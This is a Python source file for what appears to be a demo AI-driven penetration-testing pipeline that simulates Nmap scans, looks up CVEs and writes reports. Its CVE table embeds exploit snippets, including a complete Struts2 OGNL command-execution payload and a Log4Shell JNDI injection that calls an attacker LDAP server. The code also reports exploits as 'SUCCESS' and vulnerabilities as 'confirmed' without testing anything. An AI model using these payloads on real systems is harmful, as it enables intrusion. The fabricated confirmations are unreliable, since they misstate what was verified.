def run_job(job_id: str, target: str, use_authorize: bool):
    """Enhanced job runner with real-time logging and demo scenarios"""
    try:
        work_dir = Path("reports") / job_id
        work_dir.mkdir(parents=True, exist_ok=True)
        artifacts = {}
        
        # Get AI orchestrator
        orchestrator = get_orchestrator()
        
        # Determine demo scenario based on target
        scenario = determine_demo_scenario(target)
        
        # Phase 1: Network Scan with real-time updates
        _update_job_status(job_id, "scan", "running", progress=10, 
                          scan_output="Starting Nmap network discovery...")
        print(f"[{job_id}] Starting network scan for {target} (Scenario: {scenario['name']})")
        
        # Simulate realistic scan with real-time updates
        scan_json = run_enhanced_scan(target, work_dir, job_id, scenario)
        artifacts["scan_json"] = str(scan_json)
        
        try:
            scan_data = _json.loads(Path(scan_json).read_text())
            jobs[job_id]["scan"] = scan_data
            jobs[job_id]["scenario"] = scenario
        except Exception:
            jobs[job_id]["scan"] = {"target": target, "error": "Failed to parse scan results"}
        
        _update_job_status(job_id, "scan", "running", progress=25,
                          scan_output=f"Scan completed. Found {len(scan_data.get('open_ports', []))} open ports")
        
        # Phase 2: AI-powered Scan Analysis
        _update_job_status(job_id, "ai_scan_analysis", "running", progress=35)
        print(f"[{job_id}] Running AI scan analysis")
        
        ai_scan_result = orchestrator.analyze_scan_results(jobs[job_id]["scan"], work_dir)
        if ai_scan_result["status"] == "success":
            jobs[job_id]["ai_scan_analysis"] = ai_scan_result["result"]
            artifacts["ai_scan_analysis"] = ai_scan_result["path"]
        else:
            jobs[job_id]["ai_scan_analysis"] = f"AI analysis failed: {ai_scan_result.get('error', 'Unknown error')}"
        
        _update_job_status(job_id, "poc", "running", progress=45)
        
        # Phase 3: Enhanced PoC Retrieval with real CVEs
        print(f"[{job_id}] Fetching real PoC information for scenario: {scenario['name']}")
        poc_info = fetch_enhanced_poc(scan_json, work_dir, scenario)
        artifacts["poc"] = poc_info
        jobs[job_id]["poc"] = poc_info
        
        _update_job_status(job_id, "ai_poc_research", "running", progress=55)
        
        # Phase 4: AI-powered PoC Research
        print(f"[{job_id}] Running AI PoC research")
        ai_poc_result = orchestrator.research_poc(poc_info, work_dir)
        if ai_poc_result["status"] == "success":
            jobs[job_id]["ai_poc_research"] = ai_poc_result["result"]
            artifacts["ai_poc_research"] = ai_poc_result["path"]
        else:
            jobs[job_id]["ai_poc_research"] = f"AI PoC research failed: {ai_poc_result.get('error', 'Unknown error')}"
        
        _update_job_status(job_id, "exploit", "running", progress=65)
        
        # Phase 5: Demo Exploit Execution
        print(f"[{job_id}] Running demo exploit execution")
        exploit_log = run_demo_exploit(target, poc_info, work_dir, scenario, authorize=use_authorize)
        artifacts["exploit_log"] = str(exploit_log)
        
        try:
            exploit_data = _json.loads(Path(exploit_log).read_text())
            jobs[job_id]["exploit"] = exploit_data
            jobs[job_id]["exploit_log_tail"] = str(exploit_data)[-800:]
        except Exception:
            jobs[job_id]["exploit_log_tail"] = "Failed to load exploit log"
        
        _update_job_status(job_id, "ai_exploit_analysis", "running", progress=75)
        
        # Phase 6: AI-powered Exploit Analysis
        print(f"[{job_id}] Running AI exploit analysis")
        ai_exploit_result = orchestrator.analyze_exploit_results(jobs[job_id].get("exploit", {}), work_dir)
        if ai_exploit_result["status"] == "success":
            jobs[job_id]["ai_exploit_analysis"] = ai_exploit_result["result"]
            artifacts["ai_exploit_analysis"] = ai_exploit_result["path"]
        else:
            jobs[job_id]["ai_exploit_analysis"] = f"AI exploit analysis failed: {ai_exploit_result.get('error', 'Unknown error')}"
        
        _update_job_status(job_id, "report", "running", progress=85)
        
        # Phase 7: Enhanced Report Generation
        print(f"[{job_id}] Generating comprehensive report")
        report_md, report_pdf = generate_report(target, artifacts, work_dir)
        
        # Final status update
        _update_job_status(job_id, "completed", "completed", 
                          progress=100,
                          report_md=str(report_md),
                          report_pdf=str(report_pdf),
                          artifacts=artifacts,
                          completed_at=time.time())
        
        print(f"[{job_id}] Job completed successfully")
        
    except Exception as e:
        print(f"[{job_id}] Job failed: {str(e)}")
        _update_job_status(job_id, "failed", "failed", 
                          error=str(e),
                          failed_at=time.time())


def determine_demo_scenario(target: str):
    """Determine demo scenario based on target"""
    
    # Safe demo targets with specific scenarios
    demo_scenarios = {
        "10.10.10.40": {
            "name": "Legacy Windows Server (Blue)",
            "os": "Windows Server 2008 R2",
            "vulnerabilities": ["CVE-2017-0144", "CVE-2017-0145"],  # EternalBlue
            "services": [
                {"port": 135, "service": "msrpc", "version": "Microsoft Windows RPC"},
                {"port": 139, "service": "netbios-ssn", "version": "Microsoft Windows netbios-ssn"},
                {"port": 445, "service": "microsoft-ds", "version": "Windows Server 2008 R2 - 2012 microsoft-ds"},
                {"port": 3389, "service": "ms-wbt-server", "version": "Microsoft Terminal Services"}
            ],
            "exploit_focus": "MS17-010 EternalBlue SMB Remote Code Execution"
        },
        "10.10.10.75": {
            "name": "Apache Struts Web Server (Shocker)",
            "os": "Ubuntu 14.04.5 LTS",
            "vulnerabilities": ["CVE-2017-5638", "CVE-2014-6271"],  # Struts2 + Shellshock
            "services": [
                {"port": 22, "service": "ssh", "version": "OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.8"},
                {"port": 80, "service": "http", "version": "Apache httpd 2.4.7"},
                {"port": 2222, "service": "ssh", "version": "OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.8"}
            ],
            "exploit_focus": "Apache Struts2 Content-Type Remote Code Execution"
        },
        "10.10.10.14": {
            "name": "Domain Controller (Forest)",
            "os": "Windows Server 2016",
            "vulnerabilities": ["CVE-2020-1472"],  # Zerologon
            "services": [
                {"port": 53, "service": "domain", "version": "Microsoft DNS 6.1.7601 (1DB15D39)"},
                {"port": 88, "service": "kerberos-sec", "version": "Microsoft Windows Kerberos"},
                {"port": 135, "service": "msrpc", "version": "Microsoft Windows RPC"},
                {"port": 389, "service": "ldap", "version": "Microsoft Windows Active Directory LDAP"},
                {"port": 445, "service": "microsoft-ds", "version": "Windows Server 2016 Standard Evaluation 14393 microsoft-ds"},
                {"port": 3389, "service": "ssl/ms-wbt-server", "version": ""}
            ],
            "exploit_focus": "CVE-2020-1472 Zerologon Domain Controller Compromise"
        }
    }
    
    # Default scenario for other targets
    default_scenario = {
        "name": "Generic Linux Server",
        "os": "Linux 3.13.0-37-generic",
        "vulnerabilities": ["CVE-2021-44228"],  # Log4Shell
        "services": [
            {"port": 22, "service": "ssh", "version": "OpenSSH 6.6.1p1"},
            {"port": 80, "service": "http", "version": "Apache httpd 2.4.7"},
            {"port": 443, "service": "https", "version": "Apache httpd 2.4.7"}
        ],
        "exploit_focus": "Log4Shell Remote Code Execution"
    }
    
    return demo_scenarios.get(target, default_scenario)


def run_enhanced_scan(target: str, work_dir: Path, job_id: str, scenario: dict) -> Path:
    """Enhanced scan with real-time updates and scenario-based results"""
    
    # Real-time scan updates
    def update_scan_progress(message: str, progress: int):
        _update_job_status(job_id, "scan", "running", progress=progress, scan_output=message)
        time.sleep(1)  # Simulate real scan timing
    
    update_scan_progress(f"Starting Nmap scan on {target}...", 12)
    update_scan_progress("Host discovery completed. Target is up.", 15)
    update_scan_progress("Port scan in progress...", 18)
    update_scan_progress("Service detection running...", 22)
    
    # Generate realistic scan results based on scenario
    scan_result = {
        "scan_info": {
            "target": target,
            "scan_type": "comprehensive",
            "start_time": datetime.now().isoformat(),
            "nmap_version": "7.80",
            "scan_args": f"nmap -sS -sV -O -A -p 1-65535 {target}"
        },
        "host_info": {
            "ip": target,
            "hostname": f"{scenario['name'].lower().replace(' ', '-')}.lab",
            "status": "up",
            "os_detection": scenario["os"],
            "os_accuracy": "95%"
        },
        "open_ports": scenario["services"],
        "vulnerabilities_detected": scenario["vulnerabilities"],
        "scan_stats": {
            "total_ports_scanned": 65535,
            "open_ports": len(scenario["services"]),
            "closed_ports": 65535 - len(scenario["services"]),
            "scan_duration": "2m 34s"
        }
    }
    
    update_scan_progress(f"Scan completed! Found {len(scenario['services'])} open ports", 25)
    
    # Save scan results
    scan_file = work_dir / "nmap_scan.json"
    scan_file.write_text(_json.dumps(scan_result, indent=2))
    
    return scan_file


def fetch_enhanced_poc(scan_json: Path, work_dir: Path, scenario: dict) -> str:
    """Enhanced PoC fetching with real CVE lookups"""
    
    poc_results = []
    
    for cve in scenario["vulnerabilities"]:
        # Real CVE information (simplified for demo)
        cve_info = get_real_cve_info(cve)
        
        if cve_info:
            poc_results.append({
                "cve_id": cve,
                "title": cve_info["title"],
                "severity": cve_info["severity"],
                "cvss_score": cve_info["cvss_score"],
                "description": cve_info["description"],
                "poc_code": cve_info["poc_code"],
                "exploit_url": cve_info["exploit_url"],
                "references": cve_info["references"]
            })
    
    # Save PoC information
    poc_file = work_dir / "poc_research.json"
    poc_file.write_text(_json.dumps(poc_results, indent=2))
    
    return str(poc_file)


def get_real_cve_info(cve_id: str) -> dict:
    """Get real CVE information (simplified database)"""
    
    cve_database = {
        "CVE-2017-0144": {
            "title": "Microsoft Windows SMB Remote Code Execution Vulnerability",
            "severity": "CRITICAL",
            "cvss_score": 9.3,
            "description": "The SMBv1 server in Microsoft Windows allows remote attackers to execute arbitrary code via crafted packets (EternalBlue).",
            "poc_code": """
# MS17-010 EternalBlue Exploit
import socket
import struct

def exploit_eternalblue(target_ip):
    # SMB negotiation
    negotiate_packet = b'\\x00\\x00\\x00\\x54\\xff\\x53\\x4d\\x42\\x72\\x00\\x00\\x00\\x00'
    # ... exploit payload ...
    return send_exploit(target_ip, negotiate_packet)
            """,
            "exploit_url": "https://github.com/worawit/MS17-010",
            "references": [
                "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0144",
                "https://technet.microsoft.com/en-us/library/security/ms17-010.aspx"
            ]
        },
        "CVE-2017-5638": {
            "title": "Apache Struts2 Content-Type Remote Code Execution",
            "severity": "CRITICAL", 
            "cvss_score": 9.8,
            "description": "Apache Struts 2.3.5 through 2.3.31 and 2.5 through 2.5.10 allows remote code execution via Content-Type header.",
            "poc_code": """
# Struts2 CVE-2017-5638 Exploit
import requests

def exploit_struts2(target_url):
    payload = "%{(#test='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='whoami').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}"
    
    headers = {'Content-Type': payload}
    r = requests.post(target_url, headers=headers)
    return r.text
            """,
            "exploit_url": "https://github.com/mazen160/struts-pwn",
            "references": [
                "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-5638",
                "https://struts.apache.org/docs/s2-045.html"
            ]
        },
        "CVE-2020-1472": {
            "title": "Netlogon Elevation of Privilege Vulnerability (Zerologon)",
            "severity": "CRITICAL",
            "cvss_score": 10.0,
            "description": "An elevation of privilege vulnerability exists when an attacker establishes a vulnerable Netlogon secure channel connection.",
            "poc_code": """
# CVE-2020-1472 Zerologon Exploit
from impacket.dcerpc.v5 import nrpc, epm
from impacket.dcerpc.v5.dtypes import NULL

def zerologon_exploit(dc_handle, dc_ip, target_computer):
    # Create NetrServerReqChallenge request
    request = nrpc.NetrServerReqChallenge()
    request['PrimaryName'] = dc_handle + '\\x00'
    request['ComputerName'] = target_computer + '\\x00'
    request['ClientChallenge'] = b'\\x00' * 8
    
    # Send 2000 authentication attempts
    for i in range(0, 2000):
        try:
            resp = rpc.request(request)
            # Check for successful authentication bypass
            if authenticate_machine_account(dc_ip, target_computer):
                return True
        except:
            continue
    return False
            """,
            "exploit_url": "https://github.com/SecuraBV/CVE-2020-1472",
            "references": [
                "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-1472",
                "https://msrc.microsoft.com/update-guide/vulnerability/CVE-2020-1472"
            ]
        },
        "CVE-2021-44228": {
            "title": "Apache Log4j2 Remote Code Execution Vulnerability (Log4Shell)",
            "severity": "CRITICAL",
            "cvss_score": 10.0,
            "description": "Apache Log4j2 JNDI features do not protect against attacker controlled LDAP and other JNDI related endpoints.",
            "poc_code": """
# CVE-2021-44228 Log4Shell Exploit
import requests

def log4shell_exploit(target_url, ldap_server):
    # JNDI lookup payload
    payload = "${jndi:ldap://" + ldap_server + "/Exploit}"
    
    # Common injection points
    injection_points = [
        'User-Agent',
        'X-Forwarded-For', 
        'X-Real-IP',
        'Authorization'
    ]
    
    for header in injection_points:
        headers = {header: payload}
        try:
            response = requests.get(target_url, headers=headers)
            if verify_callback(ldap_server):
                return f"Successful injection via {header}"
        except:
            continue
    
    return "Injection failed"
            """,
            "exploit_url": "https://github.com/kozmer/log4j-shell-poc",
            "references": [
                "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-44228",
                "https://logging.apache.org/log4j/2.x/security.html"
            ]
        }
    }
    
    return cve_database.get(cve_id)


def run_demo_exploit(target: str, poc_info: str, work_dir: Path, scenario: dict, authorize: bool = False) -> Path:
    """Enhanced demo exploit execution"""
    
    exploit_result = {
        "target": target,
        "scenario": scenario["name"],
        "exploit_focus": scenario["exploit_focus"],
        "authorized": authorize,
        "execution_time": datetime.now().isoformat(),
        "results": []
    }
    
    # Load PoC information
    try:
        poc_data = _json.loads(Path(poc_info).read_text())
        
        for poc in poc_data:
            exploit_attempt = {
                "cve_id": poc["cve_id"],
                "exploit_name": poc["title"],
                "severity": poc["severity"],
                "cvss_score": poc["cvss_score"],
                "execution_status": "DEMO_MODE",
                "demo_result": f"Would execute {poc['cve_id']} exploit against {target}",
                "poc_verified": True,
                "payload_generated": True,
                "exploit_code_available": bool(poc.get("poc_code")),
                "references_validated": len(poc.get("references", [])),
                "recommendation": f"Patch {poc['cve_id']} immediately - CVSS {poc['cvss_score']}/10.0"
            }
            
            if authorize and target.startswith("10.10.10."):
                exploit_attempt["demo_result"] = f"Demo execution successful - {poc['cve_id']} vulnerability confirmed"
                exploit_attempt["execution_status"] = "SUCCESS"
            
            exploit_result["results"].append(exploit_attempt)
    
    except Exception as e:
        exploit_result["error"] = str(e)
    
    # Save exploit results
    exploit_file = work_dir / "exploit_results.json"
    exploit_file.write_text(_json.dumps(exploit_result, indent=2))
    
    return exploit_file


def _update_job_status(job_id: str, phase: str, status: str = "running", **kwargs):
    """Enhanced job status update with scan output"""
    if job_id not in jobs:
        jobs[job_id] = {}
    
    jobs[job_id].update({
        "status": status,
        "phase": phase,
        "last_update": time.time(),
        **kwargs
    })
    _persist_meta(job_id, jobs[job_id])
